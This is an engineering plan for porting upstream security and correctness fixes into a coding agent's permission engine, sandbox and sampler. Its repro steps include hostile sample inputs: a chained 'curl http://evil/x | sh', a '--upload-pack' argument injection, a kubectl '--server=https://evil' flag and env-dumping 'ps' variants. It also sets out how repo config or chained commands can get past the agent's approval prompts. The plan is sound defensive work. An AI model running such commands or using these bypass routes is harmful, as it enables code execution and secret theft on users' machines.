# 上游 cherry 计划 — grok-build `ba76b0a`..`47348d13`（2026-07-26 辩证审查）

> 产出方式：5 域并行审查（shell / sampler / workspace+sandbox / pager / mcp-http）+ 政策评审员合并。
> 政策见 `agent/UPSTREAM.md` 铁律：只取安全/正确性/竞态/小 alias，拒绝整包，不覆盖 Lumen 优势区。
> **基线不变**：本轮不做整树 merge，登记 tip 为 `47348d13`，逐项 cherry 按下表推进。

## 状态

| # | 状态 | 类别/风险 | 标题 |
|---|------|-----------|------|
| 1 | ✅ 已落地 `b73d5b95` | security/low | Remove `cargo check` from built-in safe command lists (auto-approved arbitrary code exec via build.rs/proc-macros) |
| 2 | ⏳ 待做 | security/low | Sampler bearer resolver fail-closed: strip default Authorization/x-api-key when live bearer unavailable |
| 3 | ✅ 已落地 `b73d5b95` | security/low | bwrap re-exec hardening: --cap-drop ALL (one line) |
| 4 | ⏳ 待做 | security/medium | Gate project-tier permission rules behind folder trust + fix trust detector for [permission]-only repos (1-click policy-bypass → RCE) |
| 5 | ⏳ 待做 | security/medium | Marketplace git: argument-injection guard (--upload-pack via URL/ref) + timed/killable git ops, drop vendored libgit2 |
| 6 | ⏳ 待做 | security/medium | Fix chained-command allow bypass + CWE-183 prefix confusion in Bash allow rules |
| 7 | ⏳ 待做 | security/medium | kubectl safe-list guard: --kubeconfig/--server/--token/--as etc. must not ride read-verb auto-allow (exec credential plugin = code exec) |
| 8 | ⏳ 待做 | security/medium | ps environment-dump guard: `ps e`/`-E`/BSD clusters leak env secrets under always-safe |
| 9 | ⏳ 待做 | security/medium | Seccomp namespace lockdown inside sandbox: block unshare/setns/clone(CLONE_NEW*)/clone3 (classic bwrap escape) |
| 10 | ⏳ 待做 | security/medium | init.rs fail-closed ordering: apply remote signature kill-switch BEFORE managed-policy gate |
| 11 | ⏳ 待做 | correctness/low | merge.rs: stale remote turn counter demotes real local sessions to dedupable empty drafts (one-line fix) |
| 12 | ⏳ 待做 | correctness/low | HTTP retry pool-escape: fresh-client build failure panics the process on the recovery path — make fallible with pooled fallback |
| 13 | ⏳ 待做 | correctness/low | Honor zero retry budget: max_retries==0 bypassed by image-strip, doom-loop, and env-override paths |
| 14 | ⏳ 待做 | correctness/low | /dev/fd is a directory: move DEVICE_FILES→DEVICE_DIRS (fixes process substitution inside sandbox) |
| 15 | ⏳ 待做 | correctness/low | device_file_openable: ENXIO/ENODEV device nodes must not fail profile resolution (containers/CI) |
| 16 | ⏳ 待做 | correctness/low | Marketplace refresh: move blocking git sync to spawn_blocking (TUI freeze fix) |
| 17 | ⏳ 待做 | correctness/low | Esc-rewind must not clobber a newer composer draft + rewound prompts must not be re-adopted |
| 18 | ⏳ 待做 | correctness/low | Pin `git status --untracked-files=normal` so user gitconfig cannot hide untracked files from agent context |
| 19 | ⏳ 待做 | correctness/medium | compact_held_prompt: user prompt silently lost when auto-compact coincides with 401 re-auth (DeepSeek key expiry mid-compact) |
| 20 | ⏳ 待做 | correctness/medium | Fork data-loss kernel: rewind filtering before truncation + truncate-after-prompt off-by-one + compaction-checkpoint copy (优势区-adjacent, kept — justified) |
| 21 | ⏳ 待做 | race-fix/medium | Leader flock race/hang cluster: stale-inode re-open polling, release ordering, lock-then-socket invariant, bounded zombie eviction |
| 22 | ⏳ 待做 | race-fix/medium | Cancellation interrupts retry/backoff sleeps (sleep_or_cancel) instead of sleeping out full rate-limit backoff |
| 23 | ⏳ 待做 | alias/low | Canonicalize raw 0x02 (STX) byte to Ctrl+B in the keyboard normalizer |

## 逐项配方

### #1 Remove `cargo check` from built-in safe command lists (auto-approved arbitrary code exec via build.rs/proc-macros)
- **类别/风险**：security / low
- **文件**：`agent/crates/codegen/xai-grok-workspace/src/permission/manager.rs`
- **配方**：Verified live: manager.rs:196 (`matches_command_prefix(cmd, "cargo check")`) and :246 (`"cargo check"` in ALWAYS_SAFE_COMMANDS). Delete both list entries and flip the asserting tests at :3240-3242 to assert NOT safe. Pure two-line Lumen-side edit mirroring upstream's deletion; no hunk-apply needed. manager.rs is lumen-guard/discipline 优势区 but these are independent list lines — zero structural contact. UX cost: cargo check prompts once per repo, consistent with discipline posture.
- **验收**：cargo test -p xai-grok-workspace permission — flipped assertions green; grep -n 'cargo check' agent/crates/codegen/xai-grok-workspace/src/permission/manager.rs returns only test lines asserting unsafe.

### #2 Sampler bearer resolver fail-closed: strip default Authorization/x-api-key when live bearer unavailable
- **类别/风险**：security / low
- **文件**：`agent/crates/codegen/xai-grok-sampler/src/client.rs`
- **配方**：From upstream 6e386420 hand-apply ONLY the post() and current_sent_bearer_prefix() function bodies: when a resolver is wired, always remove AUTHORIZATION and x-api-key headers and re-insert only from a live bearer; resolver None ⇒ nothing sent and attribution reports none (no fallback to stripped default). Preserve Lumen's client_post logging block between the two functions (file has ~760 lines local drift but both functions are baseline-shaped). Port both regression tests (bearer_resolver_none_strips_default_authorization, bearer_resolver_none_attribution_ignores_default_headers) adapted to Lumen's minimal_config — do NOT pull upstream's query_params/env_http_headers config fields into the tests.
- **验收**：cargo test -p xai-grok-sampler bearer_resolver — 2 new tests green; full sampler suite green (Lumen observer/cache-epoch/DeepSeek-E0 tests unaffected).

### #3 bwrap re-exec hardening: --cap-drop ALL (one line)
- **类别/风险**：security / low
- **文件**：`agent/crates/codegen/xai-grok-sandbox/src/lib.rs`
- **配方**：Add `cmd.arg("--cap-drop").arg("ALL")` at the top of bwrap_reexec_command. Take ONLY this line — do not take bwrap_reexec_command_ex or any hook-plan wiring from the same diff. File is clean at Lumen HEAD (no local commits since 853a3053).
- **验收**：cargo test -p xai-grok-sandbox; Linux (docker) smoke: sandboxed bash command still runs, `capsh --print` inside sandbox shows empty capability sets.

### #4 Gate project-tier permission rules behind folder trust + fix trust detector for [permission]-only repos (1-click policy-bypass → RCE)
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-workspace/src/permission/resolution.rs`, `agent/crates/codegen/xai-grok-workspace/src/permission/claude_settings.rs`, `agent/crates/codegen/xai-grok-workspace/src/folder_trust.rs`, `agent/crates/codegen/xai-grok-workspace/src/discovery.rs`, `agent/crates/codegen/xai-grok-workspace/src/hub_server.rs`, `agent/crates/codegen/xai-grok-shell/src/agent/folder_trust.rs`, `agent/crates/codegen/xai-grok-shell/src/session/acp_session_impl/spawn.rs`, `agent/crates/codegen/xai-grok-shell/src/inspect/mod.rs`
- **配方**：MERGED item (workspace detector/gate fix + shell regression test = same vulnerability). Verified live: resolution.rs has load_config_toml_permissions (line 253, consumed at :480) with NO trust gate, and workspace folder_trust.rs lacks the [permission] marker — an untrusted clone shipping `.claude/settings.json` defaultMode:bypassPermissions or `.grok/config.toml` [permission] allow=["Bash(*)"] loads ungated. Port upstream's project_trusted threading, anchoring on Lumen's actual function names (Lumen's resolver shape differs from upstream tip — hand-port, not patch-apply): (a) thread project_trusted through the permission resolvers; gate load_config_toml_permissions and project-tier .claude/settings.json loads behind it via a claude_settings_paths_for_trust choke point; (b) add the `[permission]` contributing-section marker to the workspace trust detector + test repo_configs_present_detects_grok_config_permission; (c) shell side: compute project_trusted via existing agent/folder_trust::project_scope_allowed and pass it at the resolver call in spawn.rs (~3 lines at existing call ≈ line 232 — spawn.rs is acp_session 优势区: touch ONLY the call site, nothing around it) and at inspect/mod.rs's call; hub/cloud callers pass true (upstream did same). (d) add shell e2e test project_scope_allowed_denies_untrusted_permission_only_repo. Trim the coupled '.grok/workflows' marker hunk or keep as harmless over-gating. Never modify lumen-guard — this gates a layer below it.
- **验收**：cargo test -p xai-grok-workspace folder_trust permission && cargo test -p xai-grok-shell folder_trust; manual repro: untrusted dir whose ONLY config is .grok/config.toml [permission] allow=["Bash(*)"] → trust prompt appears and Bash is NOT auto-allowed; CI Expert gate green (spawn.rs touched).

### #5 Marketplace git: argument-injection guard (--upload-pack via URL/ref) + timed/killable git ops, drop vendored libgit2
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-plugin-marketplace/src/git.rs`, `agent/crates/codegen/xai-grok-plugin-marketplace/Cargo.toml`, `agent/crates/codegen/xai-grok-agent/src/plugins/git_install.rs`
- **配方**：Verified live: Lumen git.rs has ZERO validate_git_url/validate_git_ref (behind even the absorbed baseline) and CLI clone/fetch lack `--` terminators — a URL/branch starting with `-` (e.g. --upload-pack=cmd) reaches git argv as an option = command execution. Take the tip (47348d13) version of git.rs wholesale-for-this-file (plain cherry-pick will conflict since Lumen predates baseline): validation calls, `--` separators, run_git_timed with 15s NETWORK_OP_TIMEOUT + kill/reap (wait_timeout::ChildExt), libgit2 clone path removed. Port validate_git_operand/validate_git_url/validate_git_ref (~40 lines, from 47348d13:crates/codegen/xai-grok-agent/src/plugins/git_install.rs ~132-155) ADDITIVELY into Lumen's git_install.rs next to is_full_commit_sha/ensure_pinned — do not disturb the f16d27ab require_sha cherry. Cargo.toml: remove git2/vendored-libgit2, add wait-timeout = { workspace = true } (already at agent/Cargo.toml:269). Leave pub probe_git_remote uncalled — its pager/shell callers are the refused add-time-validation feature.
- **验收**：cargo test -p xai-grok-plugin-marketplace — incl. cli_git_args_terminate_options_before_operands and invalid_cache_operands_fail_before_cache_root_creation; negative: marketplace source URL `--upload-pack=touch /tmp/pwn` rejected before any git exec; cargo tree -p xai-grok-plugin-marketplace | grep -c git2 == 0.

### #6 Fix chained-command allow bypass + CWE-183 prefix confusion in Bash allow rules
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-workspace/src/permission/policy.rs`, `agent/crates/codegen/xai-grok-workspace/src/permission/bash_command_splitting.rs`, `agent/crates/codegen/xai-grok-workspace/src/permission/manager.rs`
- **配方**：Bug site: POLICY_ALLOW arm whole-string-glob-matches, so allow=["Bash(git:*)"] auto-approves `git status && curl evil|sh` and `git` prefix-matches `gitleaks`. Do NOT take upstream's 710-line policy.rs diff (entangled with refused GateDecision/gate_preflight rework). Hand-implement the invariant natively in Lumen's evaluator: an Allow Bash rule matches only if EVERY chained segment individually matches an allow rule (deny/ask side already iterates segments at baseline), with word-boundary prefix matching. Port upstream test bash_allow_does_not_grant_chained_non_allowed_commands. policy.rs/bash_command_splitting.rs are clean at Lumen HEAD; the manager.rs allow-arm integration must be inserted additively without touching lumen-guard blocks (guard runs earlier, different layer).
- **验收**：cargo test -p xai-grok-workspace policy; repro matrix: with allow=["Bash(git:*)"] — `git status` auto-allows, `git status && curl http://evil/x | sh` prompts, `gitleaks detect` prompts.

### #7 kubectl safe-list guard: --kubeconfig/--server/--token/--as etc. must not ride read-verb auto-allow (exec credential plugin = code exec)
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-workspace/src/permission/auto_mode.rs`, `agent/crates/codegen/xai-grok-workspace/src/permission/manager.rs`
- **配方**：Port KUBECTL_UNSAFE_FLAGS const (17 flags) + kubectl_has_unsafe_flag (~15-line dependency-free fn) from upstream. Hand-insert checks (Lumen kept the OLDER evaluate_bash_segments engine — no patch-apply) into: is_safe_command_words, is_always_safe_command_words, the auto-mode routine allowlist (insertion point exists at Lumen HEAD), and under whitelist PREFIX grants in the segment loop (exact-segment grants stay allowed). manager.rs is 优势区-adjacent (lumen-guard/discipline) — additive insertion only. Ship together with rank 8 (same insertion points).
- **验收**：cargo test -p xai-grok-workspace; repro: `kubectl get pods --kubeconfig /tmp/x.yaml` and `kubectl get --server=https://evil` prompt; `kubectl get pods` still auto-allows.

### #8 ps environment-dump guard: `ps e`/`-E`/BSD clusters leak env secrets under always-safe
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-workspace/src/permission/manager.rs`
- **配方**：`ps` is in Lumen's ALWAYS_SAFE_COMMANDS (manager.rs:232); BSD `ps e`/`ps auxe`, macOS `-E`, procps `-auxe` dump full process environments (API keys/tokens). Port ps_dumps_environment (~60-line self-contained fn, fail-safe: over-prompts rather than leaks; skips -o/-O format operands so `ps -eo pid,cmd` stays allowed) and check it in both safe-list fns and under whitelist prefix grants — identical insertion points as rank 7; port in the same PR.
- **验收**：cargo test -p xai-grok-workspace; repro: `ps auxe` and `ps -E` prompt; `ps aux` and `ps -eo pid,cmd` still auto-allow.

### #9 Seccomp namespace lockdown inside sandbox: block unshare/setns/clone(CLONE_NEW*)/clone3 (classic bwrap escape)
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-sandbox/src/child_net.rs`, `agent/crates/codegen/xai-grok-sandbox/src/lib.rs`
- **配方**：Take the additive ns_lockdown module from the child_net.rs diff (classic-BPF, TSYNC + NO_NEW_PRIVS: unshare/setns/legacy-clone with CLONE_NEW* → EPERM; clone3 → ENOSYS so libc falls back to inspectable legacy clone). Skip upstream's reformat of the existing network filter (churn). Upstream wires install only via the REFUSED hook_write_deny path — write a small Lumen-side shim instead: call the install fn from SandboxManager::apply for enforcing Linux profiles. child_net.rs carries Lumen commits (b4bdb5f6/6d910804 macOS sandbox-exec, Windows no-op) in DIFFERENT functions — purely additive, no overlap. GATE: must pass real-Linux verification before ship (dev machine is macOS).
- **验收**：Compile on macOS; Linux docker-hardened run: inside sandbox `unshare -U true` → EPERM, `unshare --mount` → EPERM, normal process spawn + network filter unaffected; cargo test -p xai-grok-sandbox.

### #10 init.rs fail-closed ordering: apply remote signature kill-switch BEFORE managed-policy gate
- **类别/风险**：security / medium
- **文件**：`agent/crates/codegen/xai-grok-shell/src/agent/init.rs`, `agent/crates/codegen/xai-grok-shell/src/agent/models.rs`
- **配方**：Conditional RESOLVED as live: verified Lumen init.rs:27 runs managed_policy_gate() while remote_settings side effects are applied only at :99 — the vulnerable ordering (a live server could heal a tampered policy before fail-closed... actually the inverse: kill-switch state is NOT in effect when the gate evaluates). Port the settings-only prefetch (start_early_prefetch_settings_only in models.rs — explicitly NO managed-config sync) and call ensure_remote_settings_side_effects(&mut cfg, false) before the gate; reconcile with Lumen's existing fallback prefetch block (init.rs:80-99) so side effects apply exactly once. Skip co-located init_process telemetry/limits churn. 优势区 review REQUIRED on the models.rs hunk: DeepSeek defaults / default_models.json are untouchable — reject any default or catalog value riding along, then run scripts/assert-defaults.sh.
- **验收**：cargo test -p xai-grok-shell init; scripts/assert-defaults.sh green (DeepSeek defaults untouched); manual: tampered managed policy + reachable settings endpoint → still fails closed.

### #11 merge.rs: stale remote turn counter demotes real local sessions to dedupable empty drafts (one-line fix)
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-shell/src/session/merge.rs`
- **配方**：Verified live at merge.rs:228: `num_messages: r.last_turn_number.max(0) as usize`. Change to `local.num_messages.max(r.last_turn_number.max(0) as usize)`. Add upstream regression test stale_remote_turn_counter_does_not_demote_local_sessions_to_empty, adapted: skip cwd_generation test-struct fields (relocation feature absent at baseline) and skip the SessionLanes/fetch_lanes/filter_summaries_by_repo refactor entirely. File has zero Lumen commits — clean.
- **验收**：cargo test -p xai-grok-shell merge — new regression test green.

### #12 HTTP retry pool-escape: fresh-client build failure panics the process on the recovery path — make fallible with pooled fallback
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-http/src/lib.rs`
- **配方**：Verified live at lib.rs:350-356: fresh_http1_client() uses .expect("failed to build fresh HTTP/1.1 client") — aborts the process under fd/TLS exhaustion, exactly the degraded state the pool-escape final attempt exists to survive. Apply the tip diff (~30 lines): return reqwest::Result; final attempt in send_with_retry_escaping_pool logs a warn and stays on the pooled client on build failure. File is byte-identical to baseline with zero Lumen commits — clean apply of the sync-commit hunk restricted to this file.
- **验收**：cargo test -p xai-grok-http.

### #13 Honor zero retry budget: max_retries==0 bypassed by image-strip, doom-loop, and env-override paths
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-sampler/src/retry.rs`, `agent/crates/codegen/xai-grok-sampler/src/actor/request_task.rs`
- **配方**：EXTRACT from upstream 3af4d5d3 (do NOT take the commit whole — it carries the refused retry_only_before_output feature). Take only the zero-budget guards: early `if max_retries == 0 { Fatal }` in classify_error; `effective_cap == 0` guard in the 429 arm; `max_retries == 0 ||` in the is_retryable arm; `configured_max_retries == Some(0)` short-circuit before resolve_max_retries in run_request_task (so GROK_MAX_RETRIES env cannot override an explicit 0); doom_loop_recovery disabled at 0 budget. Port test zero_retry_budget_never_reuses_a_model_output_cap. Exclude the RetryPolicy field and all output_observed plumbing. retry.rs is byte-identical to baseline (clean); request_task.rs is baseline +18 lines cache-epoch wiring in different hunks (trivial).
- **验收**：cargo test -p xai-grok-sampler retry — zero-budget test green; existing retry matrix unchanged.

### #14 /dev/fd is a directory: move DEVICE_FILES→DEVICE_DIRS (fixes process substitution inside sandbox)
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-sandbox/src/paths.rs`
- **配方**：~6-line diff: /dev/fd registered via allow_file produces a wrong sandbox rule (it is a symlinked directory to /proc/self/fd), breaking `<(cmd)` process substitution and /dev/fd/N redirections. Move to DEVICE_DIRS with allow_path per upstream. paths.rs untouched by Lumen — clean apply.
- **验收**：cargo test -p xai-grok-sandbox; Linux sandbox smoke: `cat <(echo hi)` works inside sandboxed bash.

### #15 device_file_openable: ENXIO/ENODEV device nodes must not fail profile resolution (containers/CI)
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-sandbox/src/profiles.rs`
- **配方**：Extract ONLY the device_file_openable() fn + its single call-site change (replace the `!p.exists()` skip): open the node, skip NotFound/ENXIO/ENODEV, conservatively keep other errors. CAUTION: the containing upstream hunk also imports hook_write_deny symbols — take the atom, not the hunk. Directly relevant to Lumen's docker-hardened verification flows (/dev/tty is ENXIO in typical containers). File clean at Lumen HEAD.
- **验收**：cargo test -p xai-grok-sandbox; docker container where /dev/tty returns ENXIO: profile resolution succeeds and sandbox applies.

### #16 Marketplace refresh: move blocking git sync to spawn_blocking (TUI freeze fix)
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-shell/src/extensions/marketplace.rs`
- **配方**：Extract refresh_sources() (mechanical extraction of the synchronous force_sync_source_cache loop) and run it via tokio::task::spawn_blocking with InternalError outcome on join failure — the sync git clone/fetch currently runs on the single-threaded LocalSet and freezes the whole UI until timeout. Near-clean apply (Lumen f16d27ab added only 2 lines to this file). Do NOT pull the add-time non-git-URL validation (already absorbed as cherry #128) or probe_git_remote callers (rank 5 leaves that fn uncalled). Coordinate landing order with rank 5 (same subsystem, different crate).
- **验收**：cargo test -p xai-grok-shell marketplace; manual: trigger source refresh with an unreachable git remote — TUI stays responsive, extensions modal escapable.

### #17 Esc-rewind must not clobber a newer composer draft + rewound prompts must not be re-adopted
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-pager/src/app/dispatch/turn.rs`, `agent/crates/codegen/xai-grok-pager/src/app/agent_view/mod.rs`, `agent/crates/codegen/xai-grok-pager/src/app/agent_view/session.rs`
- **配方**：Two coupled fixes: (a) add `composer_has_draft = !agent.prompt.text().is_empty() || !agent.prompt.images.is_empty()` to the `rewinding` condition in do_cancel_turn (turn.rs:218-227 matches pre-fix shape exactly; Esc/mouse-stop/palette-cancel currently overwrite a newer draft with the stashed in-flight prompt); (b) bounded FIFO rewound_prompt_ids + note_rewound_prompt()/is_rewound_prompt() in agent_view/mod.rs, plus one extra && clause at session.rs:797 blocking should_adopt_running_prompt so late-adoption paths cannot resurrect a rewound prompt as a running turn. Port the renamed e2e test esc_cancels_running_turn_from_prompt_preserves_draft.rs. STRIP feature-coupled fragments from the same hunks: `s.workflow_run_id.is_none()`, the `stashed.combined_scrollback_entries` removal loop, and the `combined_texts` param on apply_turn_start_shim (workflows/combine features, refused). turn.rs clean; mod.rs/session.rs have Lumen commits but hunks are additive.
- **验收**：cargo test -p xai-grok-pager esc_cancels — e2e test green; manual: type draft while turn runs, press Esc → draft preserved.

### #18 Pin `git status --untracked-files=normal` so user gitconfig cannot hide untracked files from agent context
- **类别/风险**：correctness / low
- **文件**：`agent/crates/codegen/xai-grok-workspace/src/file_system/git_status.rs`
- **配方**：One-flag change + error-message update: `git status --short --branch` honors status.showUntrackedFiles=no, silently hiding untracked files from the <git_status> prompt block. Add --untracked-files=normal. File untouched by Lumen — clean apply. (Distinct from the REFUSED user_message.rs git_status_short prompt-template change — that stays out; this only makes the command config-independent.)
- **验收**：cargo test -p xai-grok-workspace git_status; manual: repo with status.showUntrackedFiles=no → untracked file appears in the block.

### #19 compact_held_prompt: user prompt silently lost when auto-compact coincides with 401 re-auth (DeepSeek key expiry mid-compact)
- **类别/风险**：correctness / medium
- **文件**：`agent/crates/codegen/xai-grok-pager/src/app/agent.rs`, `agent/crates/codegen/xai-grok-pager/src/app/acp_handler/session_notification.rs`, `agent/crates/codegen/xai-grok-pager/src/app/dispatch/prompt.rs`, `agent/crates/codegen/xai-grok-pager/src/app/dispatch/session/fork.rs`, `agent/crates/codegen/xai-grok-pager/src/app/dispatch/session/lifecycle.rs`, `agent/crates/codegen/xai-grok-pager/src/app/dispatch/session/load.rs`
- **配方**：AutoCompactStarted clears in_flight_prompt (intentional), so a 401 during compaction finds nothing to stash — the prompt is gone and not resubmitted after /login. Add AgentSession::compact_held_prompt: hold clone on AutoCompactStarted; clear on AutoCompactCompleted/Cancelled, start_turn, session reset; reauth stash falls back `.or_else(|| compact_held_prompt.clone())`. EXCLUDE the sibling combined_scrollback_entries field on InFlightPrompt (combine feature; the hold works on clones). PRECONDITION: prompt.rs:1195 region carries Lumen DeepSeek-first/truth-hardening edits (877ecbd3/37dd695f/b5ff8363) — verify Lumen's reauth flow (scrollback_has_recent_reauth_prompt at ~:1153) still routes through this stash BEFORE applying; hunks are small and additive, do not reorder Lumen logic. Add compact_held_prompt: None to every AgentSession literal (fork/lifecycle/load + Lumen-local test constructors — the compiler enumerates them).
- **验收**：cargo test -p xai-grok-pager auth (adapted upstream dispatch/tests/auth.rs test whose comment states the failure); full pager suite compiles (catches missed struct literals); manual: expire DeepSeek key, trigger auto-compact + prompt → after /login the prompt auto-resubmits.

### #20 Fork data-loss kernel: rewind filtering before truncation + truncate-after-prompt off-by-one + compaction-checkpoint copy (优势区-adjacent, kept — justified)
- **类别/风险**：correctness / medium
- **文件**：`agent/crates/codegen/xai-grok-shell/src/session/storage/jsonl/mod.rs`, `agent/crates/codegen/xai-grok-shell/src/session/acp_session_tests/rewind_cross_compaction_tests.rs`
- **配方**：KEPT despite Expert-region overlap because it COMPOSES with (never replaces) Lumen's Expert dual-copy code, and the failure is silent session-history corruption: forking a rewound/compacted session copies dead-branch history and dereferences missing checkpoints. Hand-apply 3 atoms inside copy_session_data: (1) updates_to_copy = filter_rewind_updates(...) BEFORE updates_truncate_for_prompt; (2) chat truncation → conversation_truncate_after_prompt(target_idx) (== for_prompt(target_idx+1)), fixing the off-by-one dropping the target prompt's own turn; (3) collect CompactionCheckpoint file names from copied updates and copy those files into the fork, keeping the path-confinement guard (parent == compaction_checkpoints, exact file_name match — also blocks traversal). All deps (filter_rewind_updates, CompactionCheckpoint, updates_truncate_for_prompt) exist at baseline. MUST EXCLUDE: is_orchestration_projection_update retain and remove_dir_all of workflows_dir/goal_mode_state (upstream-only state; blind copy could delete Lumen state). MUST PRESERVE verbatim: Lumen E1/E2 dual-copy + expert_mode_state_file lines (476ae928/56f5291b) in the same region. Decide (recommend YES) whether expert_mode_state_file needs the same fork-copy treatment as checkpoints; if deferred, file a follow-up.
- **验收**：cargo test -p xai-grok-shell rewind_cross_compaction AND the full Expert test set — CI Expert gate green is mandatory before merge; manual: rewind → compact → fork → rewind in the fork succeeds with correct live-branch history.

### #21 Leader flock race/hang cluster: stale-inode re-open polling, release ordering, lock-then-socket invariant, bounded zombie eviction
- **类别/风险**：race-fix / medium
- **文件**：`agent/crates/codegen/xai-grok-shell/src/leader/lock.rs`, `agent/crates/codegen/xai-grok-shell/src/leader/mod.rs`, `agent/crates/codegen/xai-grok-shell/src/leader/server.rs`, `agent/crates/codegen/xai-grok-shell/tests/test_leader_death_repro.rs`, `agent/crates/codegen/xai-grok-shell/tests/test_leader_version_skew.rs`
- **配方**：Take as ONE coherent cherry from the 0.2.112 sync (largest candidate, ~1k net lines incl. rewritten repro tests): (a) try_acquire_timeout → async acquire_reopen_timeout re-opening the lock path every 200ms (a held fd polls a stale unlinked inode forever after an old-flow Drop unlinks it); (b) release() clears was_leader BEFORE unlock() so an unlock error can't make Drop delete the live child leader's socket; (c) only the flock winner may bind/clobber the socket; (d) zombie-leader net: PID-keyed 30s timer, /proc/locks-confirmed holder (never SIGKILL unproven holders; macOS None ⇒ no auto-kill), MAX_ZOMBIE_EVICT_ATTEMPTS=3 + MAX_SELF_SPAWN_ATTEMPTS=3 so connect_or_spawn errors instead of forking forever, force-kill → re-SIGTERM. Strip co-located json! telemetry formatting churn in mod.rs. Public method becomes async — fix callers. Only Lumen f57de18f (clippy baseline) touched leader/ — expect trivial formatting conflicts.
- **验收**：cargo test -p xai-grok-shell leader — incl. acquire_reopen_timeout_tolerates_unlinked_recreated_lock_file, racing_leader_without_flock_cannot_clobber_socket, test_leader_death_repro, version_skew; Linux docker smoke: rapid concurrent launches don't hang startup.

### #22 Cancellation interrupts retry/backoff sleeps (sleep_or_cancel) instead of sleeping out full rate-limit backoff
- **类别/风险**：race-fix / medium
- **文件**：`agent/crates/codegen/xai-grok-sampler/src/actor/request_task.rs`
- **配方**：EXTRACT from 3af4d5d3 (same commit as rank 13 — land together, one extraction pass): add sleep_or_cancel (biased select on cancelled() vs sleep), use in the Retry / RetryWithBackoff / RetryWithClientRebuild arms and the doom-loop backoff; on cancel emit terminal cancellation via handle_cancellation (exists at Lumen ~line 727) and complete the oneshot immediately — currently a user cancel during a minutes-long retry_after backoff waits out the full sleep. apply_retry_decision gains a cancel_token param (update all 3 call sites). DROP everything referencing output_observed/effective_max_retries/stream_responses_tracked (refused feature). Cache-epoch wiring (ce8e52ca, +18 lines) is in different hunks — no overlap. Port tests retry_sleep_returns_immediately_on_cancellation and retry_decision_cancellation_emits_terminal_cancel.
- **验收**：cargo test -p xai-grok-sampler — both new cancellation tests green; existing cancellation/cache-epoch tests unchanged.

### #23 Canonicalize raw 0x02 (STX) byte to Ctrl+B in the keyboard normalizer
- **类别/风险**：alias / low
- **文件**：`agent/crates/codegen/xai-grok-pager/src/input/keyboard_normalizer.rs`
- **配方**：6-line fix + regression test: legacy terminals deliver Ctrl+B as raw \u{0002} with empty modifiers; rescue_key returned it untouched so it never matched key!('b', CONTROL) and could be treated as text input. Apply the canonicalization unconditionally before the modifier-probe gate. REFUSE the motivating Ctrl+G→Ctrl+B default-keybind rename (default change) — the canonicalization is binding-agnostic and harmless. Pre-check whether Lumen binds Ctrl+B to anything; take regardless (prevents stray STX entering text). File clean at Lumen HEAD.
- **验收**：cargo test -p xai-grok-pager keyboard_normalizer — new test asserts !is_text_input_key after canonicalization.

## 明确拒绝（整包类，按铁律）

- Wholesale: all 6 opaque 'Synced from monorepo' commits (0.2.107-0.2.112, 957 files, +129.9k/−48.1k) refused as merges per PINNED policy — only the 23 point-cherries above are extracted; baseline stays ba76b0a/0.2.106 until each cherry lands individually.
- Workflows subsystem everywhere (shell workflow/* ~5.6k lines + jsonl workflow state, pager views/overlay/ingest ~4k, mcp-tools ToolKind::Workflow, '.grok/workflows' trust marker beyond the harmless over-gate) — new orchestration feature, not a fix.
- Pager feature bundles (pager-rewrite class): /doctor diagnostics ~7k lines incl. tmux_probe (if tmux hangs matter, write a ~20-line local timeout instead), tutorial system, voice interim-commit, privacy banner, external-editor rewrite, combine-queued-prompts, endline-park markerless rework, session-title/lanes/dashboard/turn_status churn, npm installer rework, /terminal-setup removal.
- Config/model surface: model_providers.rs +1010 and agent/config.rs +1671 provider/gateway expansion, auth_provider rework bundle (+1.7k), query_params/env_http_headers, x_search/web_search hosted-tool overrides, prompt_cache_key (collides with Lumen prompt_cache_registry/cache_epoch 优势区), ReasoningEffort::Max tier split (REMOVES the max→xhigh alias — not a tiny-alias add), and the default web-search model change grok-4.20→grok-4.5 (default-model change, iron-rule refusal; DeepSeek defaults + default_models.json untouchable).
- Architecture rewrites: session relocation + S3 mirroring + cwd_generation + WorkingDirectorySwitch; subagent-coordinator channel-backend rewrite (its cross-session completion-leak fix is inseparable and baseline already guards monitor events); mcp-tools task/coordinator rewrite (−753/+3000); scheduler occurrence-journal rewrite; shell_environment_policy (conflicts with Lumen's sandbox-modified terminal.rs).
- Permission-engine revamp (exec_risk +826, gate_preflight, shell_access protected-edit +1190, classifier telemetry) — collides head-on with lumen-guard L0-L3 + discipline in manager.rs (优势区); only the four buried point fixes were extracted (ranks 1, 6, 7, 8).
- hook_write_deny sandbox bundle (+~1.3k incl. e2e) — hooks-bundle iron rule; only the two separable atoms taken (ranks 3, 9).
- Fixes welded to refused features (not extractable): background-terminal real-exit-code fix (inside exit_watcher/output_recorder modules), disk-full session-creation hang (inside persistence durability rework + spawn.rs 优势区), auto-compact token-expiry retry + permission-classifier fail→prompt (inside run_loop 优势区 churn), doom-loop auto-stop (would overwrite Lumen's own Storm/Repeat discipline).
- JUDGE DROPS from surveyed candidates: (a) AgentShutdownGuard (pager) — race-fix, high risk, hard dependency on NEW SESSION_FLUSH_GRACE in Lumen's heavily-modified xai-grok-shell 优势区 crate and unverified flush-on-cancel semantics; not security ⇒ dropped per 优势区 rule; revisit only if session-flush truncation is actually observed. (b) Momentum-scroll cancel_stream — UX-grade, fused with workflows wiring in Lumen-divergent app_view.rs.
- Misc refused: worktree auto-GC (background deletion = data-loss risk, contradicts Lumen worktree-per-thread layout), export_github +753, hub/cloud diagnostics churn, claude_import, config watcher hot-reload, SKILL.md catalog deletions (Lumen keeps its own curated skill set), Ctrl+G→Ctrl+B default keybind change, user_message.rs git_status_short prompt change (prompt is Lumen-tuned), slash/catalog table churn (/tutorial //usage /session-info /resume filtering).
